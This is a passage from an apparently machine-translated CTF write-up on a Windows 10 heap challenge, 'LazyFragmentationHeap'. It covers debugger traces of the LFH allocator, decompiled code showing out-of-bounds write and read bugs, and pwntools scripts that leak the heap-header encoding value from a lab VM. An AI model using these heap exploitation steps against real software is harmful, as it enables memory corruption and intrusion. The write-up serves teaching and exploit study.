		<span class="n">HeapFree</span><span class="p">(</span><span class="n">hHeap</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ptr_arr</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>

    <span class="n">HeapDestroy</span><span class="p">(</span><span class="n">hHeap</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="cm">/*
ntdll.dll version == 10.0.18362.418

0:001&gt; bp ntdll+3C4AD ".printf \"currIdx=0x%p\\r\\n\", @rax; g"
0:001&gt; g
currIdx=0x0000000000000010
currIdx=0x0000000000000011
currIdx=0x0000000000000012
currIdx=0x0000000000000013
currIdx=0x0000000000000014
currIdx=0x0000000000000015
currIdx=0x0000000000000016
currIdx=0x0000000000000017
currIdx=0x0000000000000018
currIdx=0x0000000000000019
currIdx=0x000000000000001a
currIdx=0x000000000000001b
currIdx=0x000000000000001c
currIdx=0x000000000000001d
currIdx=0x000000000000001e
currIdx=0x000000000000001f
currIdx=0x0000000000000020
currIdx=0x0000000000000021
currIdx=0x0000000000000022
currIdx=0x0000000000000023
currIdx=0x0000000000000024
currIdx=0x0000000000000025
currIdx=0x0000000000000026
currIdx=0x0000000000000027
currIdx=0x0000000000000028
currIdx=0x0000000000000029
currIdx=0x000000000000002a
currIdx=0x000000000000002c
currIdx=0x000000000000002d
currIdx=0x000000000000002e
currIdx=0x000000000000002f
currIdx=0x0000000000000030
currIdx=0x0000000000000031
currIdx=0x0000000000000032
currIdx=0x0000000000000033
currIdx=0x0000000000000034
currIdx=0x0000000000000035
currIdx=0x0000000000000036
currIdx=0x0000000000000037
currIdx=0x0000000000000038
currIdx=0x0000000000000039
currIdx=0x000000000000003a
currIdx=0x000000000000003b
currIdx=0x000000000000003c
currIdx=0x000000000000003d
currIdx=0x000000000000003e
currIdx=0x000000000000003f
currIdx=0x0000000000000040
currIdx=0x0000000000000041
currIdx=0x0000000000000042
currIdx=0x0000000000000043
currIdx=0x0000000000000044
currIdx=0x0000000000000045
currIdx=0x0000000000000046
currIdx=0x0000000000000047
currIdx=0x0000000000000048
currIdx=0x0000000000000049
currIdx=0x000000000000004a
currIdx=0x000000000000004b
currIdx=0x000000000000004c
currIdx=0x000000000000004d
currIdx=0x000000000000004e
currIdx=0x000000000000004f
currIdx=0x0000000000000050
currIdx=0x0000000000000051
currIdx=0x0000000000000052
currIdx=0x0000000000000053
currIdx=0x0000000000000054
currIdx=0x0000000000000055
currIdx=0x0000000000000056
currIdx=0x0000000000000057
currIdx=0x0000000000000058
currIdx=0x0000000000000059
currIdx=0x000000000000005a
currIdx=0x000000000000005b
currIdx=0x000000000000005c
currIdx=0x000000000000005d
currIdx=0x000000000000005e
currIdx=0x000000000000005f
currIdx=0x0000000000000060
currIdx=0x0000000000000061
currIdx=0x0000000000000062
currIdx=0x0000000000000063
currIdx=0x0000000000000065
currIdx=0x0000000000000066
currIdx=0x0000000000000067
currIdx=0x0000000000000068
currIdx=0x0000000000000069
currIdx=0x000000000000006a
currIdx=0x000000000000006b
currIdx=0x000000000000006c
currIdx=0x000000000000006d
currIdx=0x000000000000006e
currIdx=0x000000000000006f
currIdx=0x0000000000000070
currIdx=0x0000000000000071
currIdx=0x0000000000000072
currIdx=0x0000000000000073
currIdx=0x0000000000000074
currIdx=0x0000000000000075
currIdx=0x0000000000000076
currIdx=0x0000000000000077
currIdx=0x0000000000000078
currIdx=0x0000000000000079
currIdx=0x000000000000007a
currIdx=0x000000000000007b
currIdx=0x000000000000007c
currIdx=0x000000000000007d
currIdx=0x000000000000007e
currIdx=0x000000000000007f
currIdx=0x0000000000000080
currIdx=0x0000000000000081
currIdx=0x0000000000000082
currIdx=0x0000000000000083
currIdx=0x0000000000000084
currIdx=0x0000000000000085
currIdx=0x0000000000000086
currIdx=0x0000000000000087
currIdx=0x0000000000000088
currIdx=0x0000000000000089
currIdx=0x000000000000008a
currIdx=0x000000000000008b
currIdx=0x000000000000008c
currIdx=0x000000000000008d
currIdx=0x000000000000008e
currIdx=0x000000000000008f
currIdx=0x0000000000000090
currIdx=0x0000000000000091
currIdx=0x0000000000000092
currIdx=0x0000000000000093
currIdx=0x0000000000000094
currIdx=0x0000000000000095
currIdx=0x0000000000000096
currIdx=0x0000000000000097
currIdx=0x0000000000000098
currIdx=0x0000000000000099
currIdx=0x000000000000009a
currIdx=0x000000000000009b
currIdx=0x000000000000009c
currIdx=0x000000000000009e
currIdx=0x000000000000009f
currIdx=0x00000000000000a0
currIdx=0x00000000000000a1
currIdx=0x00000000000000a2
currIdx=0x00000000000000a3
currIdx=0x00000000000000a4
currIdx=0x00000000000000a5
currIdx=0x00000000000000a6
currIdx=0x00000000000000a7
currIdx=0x00000000000000a8
currIdx=0x00000000000000a9
currIdx=0x00000000000000aa
currIdx=0x00000000000000ab
currIdx=0x00000000000000ac
currIdx=0x00000000000000ad
currIdx=0x00000000000000ae
currIdx=0x00000000000000af
currIdx=0x00000000000000b0
currIdx=0x00000000000000b1
currIdx=0x00000000000000b2
currIdx=0x00000000000000b3
currIdx=0x00000000000000b4
currIdx=0x00000000000000b5
currIdx=0x00000000000000b6
currIdx=0x00000000000000b7
currIdx=0x00000000000000b8
currIdx=0x00000000000000b9
currIdx=0x00000000000000ba
currIdx=0x00000000000000bb
currIdx=0x00000000000000bc
currIdx=0x00000000000000bd
currIdx=0x00000000000000be
currIdx=0x00000000000000bf
currIdx=0x00000000000000c0
currIdx=0x00000000000000c1
currIdx=0x00000000000000c2
currIdx=0x00000000000000c3
currIdx=0x00000000000000c4
currIdx=0x00000000000000c5
currIdx=0x00000000000000c6
currIdx=0x00000000000000c7
currIdx=0x00000000000000c8
currIdx=0x00000000000000c9
currIdx=0x00000000000000ca
currIdx=0x00000000000000cb
currIdx=0x00000000000000cc
currIdx=0x00000000000000cd
currIdx=0x00000000000000ce
currIdx=0x00000000000000cf
currIdx=0x00000000000000d0
currIdx=0x00000000000000d1
currIdx=0x00000000000000d2
currIdx=0x00000000000000d3
currIdx=0x00000000000000d4
currIdx=0x00000000000000d5
currIdx=0x00000000000000d7
currIdx=0x00000000000000d8
currIdx=0x00000000000000d9
currIdx=0x00000000000000da
currIdx=0x00000000000000db
currIdx=0x00000000000000dc
currIdx=0x00000000000000dd
currIdx=0x00000000000000de
currIdx=0x00000000000000df
currIdx=0x00000000000000e0
currIdx=0x00000000000000e1
currIdx=0x00000000000000e2
currIdx=0x00000000000000e3
currIdx=0x00000000000000e4
currIdx=0x00000000000000e5
currIdx=0x00000000000000e6
currIdx=0x00000000000000e7
currIdx=0x00000000000000e8
currIdx=0x00000000000000e9
currIdx=0x00000000000000ea
currIdx=0x00000000000000eb
currIdx=0x00000000000000ec
currIdx=0x00000000000000ed
currIdx=0x00000000000000ee
currIdx=0x00000000000000ef
currIdx=0x00000000000000f0
currIdx=0x00000000000000f1
currIdx=0x00000000000000f2
currIdx=0x00000000000000f3
currIdx=0x00000000000000f4
currIdx=0x00000000000000f5
currIdx=0x00000000000000f6
currIdx=0x00000000000000f7
currIdx=0x00000000000000f8
currIdx=0x00000000000000f9
currIdx=0x00000000000000fa
currIdx=0x00000000000000fb
currIdx=0x00000000000000fc
currIdx=0x00000000000000fd
currIdx=0x00000000000000fe
currIdx=0x00000000000000ff
currIdx=0x0000000000000000
currIdx=0x0000000000000001
currIdx=0x0000000000000002
currIdx=0x0000000000000003
currIdx=0x0000000000000067 &lt;--- here, @AmarSaar's vuln has been mitigated
currIdx=0x0000000000000068
currIdx=0x0000000000000069
currIdx=0x000000000000006a
currIdx=0x000000000000006b
currIdx=0x000000000000006c
currIdx=0x000000000000006d
currIdx=0x000000000000006e
currIdx=0x000000000000006f
currIdx=0x0000000000000070
currIdx=0x0000000000000071
currIdx=0x0000000000000073
currIdx=0x0000000000000074
currIdx=0x0000000000000075
currIdx=0x0000000000000076
currIdx=0x0000000000000077
*/</span>
</code></pre>
     </div>
    </div>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">That's all I've learned about LFH. </font><font style="vertical-align: inherit;">Now let’s analyze the problem file.</font></font></p>
    <h1 id="4-익스플로잇"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. Exploit</font></font></h1>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">It
 appears to be a typical heap problem where input is received in MENU 
format and operations such as allocate, free, and edit can be performed 
as shown below.</font></font></p>
    <div class="language-plaintext highlighter-rouge">
     <div class="highlight">
      <pre class="highlight"><code>*****************************
    LazyFragmentationHeap
*****************************
 1. Allocate buffer for File  // alloc
 2. Edit File content         // edit
 3. Show content              // show
 4. Clean content             // free
 5. LazyFileHandler
 6. Exit
****************************
</code></pre>
     </div>
    </div>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">When you first start a problem file, </font></font><a href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">the VirtualAlloc()</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> function </font><font style="vertical-align: inherit;">allocates memory with only R/W permissions at address </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0xBEEFDAD0000 and uses it to manage the 40 bytes-sized structure below.</font></font></strong><font style="vertical-align: inherit;"></font></p>
    <div class="language-c highlighter-rouge">
     <div class="highlight">
      <pre class="highlight"><code><span class="k">struct</span> <span class="n">lazy_chunk</span> <span class="p">{</span>
    <span class="n">ULONGLONG</span> <span class="n">magic1</span><span class="p">;</span>    <span class="c1">// 0x0000DDAABEEF1ACD      | offset 0</span>
    <span class="n">ULONGLONG</span> <span class="n">size</span><span class="p">;</span>      <span class="c1">// 0x80 &lt;= size &lt;= 0x2000  | offset 8</span>
    <span class="n">ULONGLONG</span> <span class="n">chunk_id</span><span class="p">;</span>  <span class="c1">// 0xDDAA                  | offset 16</span>
    <span class="n">ULONGLONG</span> <span class="n">magic2</span><span class="p">;</span>    <span class="c1">// 0x0000DDAABEEF1ACD      | offset 24</span>
    <span class="n">BYTE</span> <span class="o">*</span><span class="n">heap_mem</span><span class="p">;</span>      <span class="c1">// calloc(1, size)         | offset 32</span>
<span class="p">}</span>
</code></pre>
     </div>
    </div>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">After first analyzing, the part where I suspected there was a vulnerability </font></font><code class="language-plaintext highlighter-rouge">2. Edit File content</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">was the code below that is executed when you select .</font></font></p>
    <div class="language-c highlighter-rouge">
     <div class="highlight">
      <pre class="highlight"><code><span class="k">case</span> <span class="mi">2</span><span class="n">i64</span><span class="p">:</span>
<span class="c1">// skip for brevity...</span>
<span class="n">heap_mem_len</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="n">i64</span><span class="p">;</span>
<span class="n">heam_mem</span> <span class="o">=</span> <span class="n">BEEFDAD0000_mem</span><span class="p">[</span><span class="n">idx2_1</span><span class="p">].</span><span class="n">heap_mem</span><span class="p">;</span>
<span class="n">heap_size</span> <span class="o">=</span> <span class="n">BEEFDAD0000_mem</span><span class="p">[</span><span class="n">idx2_1</span><span class="p">].</span><span class="n">size</span><span class="p">;</span>
<span class="k">do</span>
  <span class="o">++</span><span class="n">heap_mem_len</span><span class="p">;</span>
<span class="k">while</span> <span class="p">(</span> <span class="n">heam_mem</span><span class="p">[</span><span class="n">heap_mem_len</span><span class="p">]</span> <span class="p">);</span>
<span class="k">if</span> <span class="p">(</span> <span class="n">heap_mem_len</span> <span class="o">&gt;</span> <span class="n">heap_size</span> <span class="o">&amp;&amp;</span> <span class="n">BEEFDAD0000_mem</span><span class="p">[</span><span class="n">idx2_1</span><span class="p">].</span><span class="n">magic2</span> <span class="o">==</span> <span class="mh">0xDDAABEEF1ACD</span><span class="n">i64</span> <span class="p">)</span>
<span class="p">{</span>  <span class="c1">// if magic2 is not corrupted, heap_size = heap_mem_len...OOB?</span>
  <span class="n">heap_size</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="n">i64</span><span class="p">;</span>
  <span class="k">do</span>
    <span class="o">++</span><span class="n">heap_size</span><span class="p">;</span>
  <span class="k">while</span> <span class="p">(</span> <span class="n">heam_mem</span><span class="p">[</span><span class="n">heap_size</span><span class="p">]</span> <span class="p">);</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">heam_mem</span><span class="p">,</span> <span class="n">heap_size</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">)</span> <span class="c1">// potential OOB write</span>
<span class="c1">// skip for brevity...</span>

</code></pre>
     </div>
    </div>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">As explained in comments, </font></font><code class="language-plaintext highlighter-rouge">heap_mem_len</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">OOB writing using appears to be possible.</font></font></p>
    <p><code class="language-plaintext highlighter-rouge">3. Show content</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">There was also code that seemed to enable OOB read as shown below.</font></font></p>
    <div class="language-c highlighter-rouge">
     <div class="highlight">
      <pre class="highlight"><code><span class="k">case</span> <span class="mi">3</span><span class="n">i64</span><span class="p">:</span>
    <span class="c1">// skip for brevity...</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">BEEFDAD0000_mem</span><span class="p">[</span><span class="n">chunk_cnt</span><span class="p">].</span><span class="n">heap_mem</span> <span class="p">)</span>
        <span class="k">goto</span> <span class="n">LABEL_59</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">BEEFDAD0000_mem</span><span class="p">[</span><span class="n">chunk_cnt</span><span class="p">].</span><span class="n">magic1</span> <span class="o">!=</span> <span class="mh">0xDDAABEEF1ACD</span><span class="n">i64</span> <span class="p">)</span>
        <span class="k">goto</span> <span class="n">LABEL_59</span><span class="p">;</span>
    <span class="n">v26</span> <span class="o">=</span> <span class="n">BEEFDAD0000_mem</span><span class="p">[</span><span class="n">chunk_cnt</span><span class="p">].</span><span class="n">magic2</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v26</span> <span class="o">!=</span> <span class="mh">0xDDAABEEF1ACD</span><span class="n">i64</span> <span class="o">&amp;&amp;</span> <span class="n">v26</span> <span class="o">!=</span> <span class="mh">0xFACE6DA61A35C767</span><span class="n">i64</span> <span class="p">)</span>
        <span class="k">goto</span> <span class="n">LABEL_59</span><span class="p">;</span>

    <span class="c1">// potential OOB read, possible to leak _HEAP_ENTRY data</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Content: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">BEEFDAD0000_mem</span><span class="p">[</span><span class="n">chunk_cnt</span><span class="p">].</span><span class="n">heap_mem</span><span class="p">);</span> 
    <span class="c1">// skip for brevity...</span>
</code></pre>
     </div>
    </div>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">So, to find the sizes that can leak the header (encoded with </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_HEAP-&gt;Encoding</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) of the heap chunk located behind OOB read, I brute-forced it as follows.</font></font></p>
    <div class="language-python highlighter-rouge">
     <div class="highlight">
      <pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># context.log_level = "debug"
</span>
<span class="c1"># HOST = "192.168.56.102" # VirtualBox Host-Only Adapter
</span><span class="n">HOST</span> <span class="o">=</span> <span class="s">"192.168.0.18"</span> <span class="c1"># VirtualBox Bridge 
</span><span class="n">PORT</span> <span class="o">=</span> <span class="mi">6677</span>

<span class="n">hi</span> <span class="o">=</span> <span class="bp">None</span>
<span class="n">sla</span> <span class="o">=</span> <span class="bp">None</span>

<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
 	<span class="n">sla</span><span class="p">(</span><span class="s">"Size:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">,</span> <span class="n">val</span><span class="p">,</span> <span class="n">need_newline</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>
	<span class="k">if</span> <span class="n">need_newline</span><span class="p">:</span>
		<span class="n">sla</span><span class="p">(</span><span class="s">"Content:"</span><span class="p">,</span> <span class="n">val</span><span class="p">)</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="n">hi</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"Content:"</span><span class="p">,</span> <span class="n">val</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">):</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>
	<span class="k">return</span> <span class="n">hi</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">"Content: "</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">):</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">open_file</span><span class="p">():</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">read_file</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>
 	<span class="n">sla</span><span class="p">(</span><span class="s">"Size:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>

<span class="n">cnt</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">hi</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
<span class="n">sla</span> <span class="o">=</span> <span class="n">hi</span><span class="p">.</span><span class="n">sendlineafter</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x2000</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">):</span>
	<span class="k">if</span> <span class="n">cnt</span> <span class="o">==</span> <span class="mi">10</span><span class="p">:</span> <span class="c1"># only 10 heap chunks can be allocated
</span>		<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">"error"</span>
		<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span>
		<span class="n">hi</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
		<span class="n">hi</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
		<span class="n">sla</span> <span class="o">=</span> <span class="n">hi</span><span class="p">.</span><span class="n">sendlineafter</span>
		<span class="n">cnt</span> <span class="o">=</span> <span class="mi">0</span>
		<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">"info"</span>

	<span class="n">alloc</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
	<span class="n">edit</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">i</span><span class="p">)</span>
	<span class="n">leak</span> <span class="o">=</span> <span class="n">show</span><span class="p">(</span><span class="n">i</span><span class="p">)[</span><span class="n">i</span><span class="p">:]</span>
	<span class="k">if</span> <span class="n">leak</span> <span class="o">!=</span> <span class="s">""</span><span class="p">:</span>
		<span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span>
		<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"size 0x%04x can be usable to info leak( 0x%016x )"</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">leak</span><span class="p">))</span>

	<span class="n">cnt</span> <span class="o">+=</span> <span class="mi">1</span>

<span class="n">hi</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

<span class="s">'''
[+] Opening connection to 192.168.0.18 on port 6677: Done
[*] size 0x0088 can be usable to info leak( 0x00005de64b3b5de3 )
[*] size 0x0098 can be usable to info leak( 0x00005de54b3b5de3 )
[*] size 0x00a8 can be usable to info leak( 0x00005de44b3b5de3 )
[*] size 0x00b8 can be usable to info leak( 0x00005de34c3b5de4 )
[*] size 0x00c8 can be usable to info leak( 0x00005de24c3b5de4 )
[*] size 0x00d8 can be usable to info leak( 0x00002e9102b2a6f5 )
[*] size 0x00e8 can be usable to info leak( 0x00002e9012b2a6e5 )
[*] size 0x00f8 can be usable to info leak( 0x00002e8f02b2a6f5 )
[*] size 0x0108 can be usable to info leak( 0x00002e8e07b2a6f0 )
[*] size 0x0118 can be usable to info leak( 0x00002e8de5b3a613 )
[*] size 0x0128 can be usable to info leak( 0x0000ceb77fd0cded )
[*] size 0x0138 can be usable to info leak( 0x0000ceb027d0cdb5 )
[*] size 0x0148 can be usable to info leak( 0x0000ceb10dd0cd9f )
[*] size 0x0158 can be usable to info leak( 0x0000ceb2f9d0cd6b )
[*] size 0x0168 can be usable to info leak( 0x0000ceb3abd0cd39 )
[*] size 0x0178 can be usable to info leak( 0x00001fb485bbdffe )
[*] size 0x0188 can be usable to info leak( 0x00001fb5fbbbdf80 )
[*] size 0x0198 can be usable to info leak( 0x00001fb62fbbdf54 )
[*] size 0x01a8 can be usable to info leak( 0x00001fb761bbdf1a )
[*] size 0x01b8 can be usable to info leak( 0x00001fb059bbdf22 )
[*] size 0x01c8 can be usable to info leak( 0x0000b3a2b2d6edd0 )
[*] size 0x01d8 can be usable to info leak( 0x0000b3a1eed6ed8c )
[*] size 0x01e8 can be usable to info leak( 0x0000b3a028d6ed4a )
...
'''</span>
</code></pre>
     </div>
    </div>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Since the value of the decoded header is always fixed, </font><font style="vertical-align: inherit;">you can use this to leak the </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_HEAP-&gt;Encoding value.</font></font></strong><font style="vertical-align: inherit;"></font></p>
    <div class="language-python highlighter-rouge">
     <div class="highlight">
      <pre class="highlight"><code><span class="c1"># skip for brevity...
</span>
<span class="n">SIZE</span> <span class="o">=</span> <span class="mh">0xC8</span>    <span class="c1"># yes, I intend korean slang
</span><span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">SIZE</span><span class="p">)</span>
<span class="n">heap_encod</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="n">SIZE</span><span class="p">:]</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00\x10</span><span class="s">"</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x1000000d02010003</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"_HEAP-&gt;Encoding = 0x%016x"</span> <span class="o">%</span> <span class="n">heap_encod</span><span class="p">)</span>
<span class="n">pause</span><span class="p">()</span>

<span class="s">'''
$ python ex.py
[+] Opening connection to 192.168.0.18 on port 6677: Done
[*] _HEAP-&gt;Encoding = 0x0000f300f8d50db2
[*] Paused (press any to continue)
....
0:001&gt; dqs beefdad0000 l5
00000bee`fdad0000  0000ddaa`beef1acd
00000bee`fdad0008  00000000`000000c8
00000bee`fdad0010  00000000`00000001
00000bee`fdad0018  face6da6`1a35c767
00000bee`fdad0020  000001e5`30874370
0:001&gt; !heap -p -a 000001e5`30874370
    address 000001e530874370 found in
    _HEAP @ 1e530870000
              HEAP_ENTRY Size Prev Flags            UserPtr UserSize - state
        000001e530874360 000d 0000  [00]   000001e530874370    000c8 - (busy)
          unknown!noop

0:001&gt; dqs 1e530870000+80 l2
000001e5`30870080  00000000`00000000
000001e5`30870088  0000f300`f8d50db2
'''</span>
</code></pre>
     </div>
    </div>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Heap chunks allocated with `1. Allocate buffer for File` are not managed by LFH, so if you only know </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_HEAP-&gt;Encoding</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , you can use the OOB write vulnerability to manipulate the header.</font></font></p>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Now,
 I need to allocate two adjacent heap chunks and manipulate the header, 
but I don't know exactly what size they should be allocated so that they
 are allocated adjacent to each other, so I found this part by 
Brute-Force as shown below based on the header leak.</font></font></p>
    <div class="language-python highlighter-rouge">
     <div class="highlight">
      <pre class="highlight"><code><span class="c1"># skip for brevity...
</span>
<span class="c1"># this takes too many times
# modify the Brute-Force range to use your instinct
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x2000</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>
	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"i = 0x%04x"</span> <span class="o">%</span> <span class="n">i</span><span class="p">)</span>
	<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x2000</span><span class="p">,</span> <span class="mi">8</span><span class="o">*</span><span class="mi">8</span><span class="p">):</span>
		<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"j = 0x%04x"</span> <span class="o">%</span> <span class="n">j</span><span class="p">)</span>
		<span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">)</span>
		<span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
		<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">i</span><span class="p">)</span>
		<span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
			<span class="n">tmp_sz</span> <span class="o">=</span> <span class="n">j</span> <span class="o">+</span> <span class="p">(</span><span class="mi">8</span><span class="o">*</span><span class="n">k</span><span class="p">)</span>
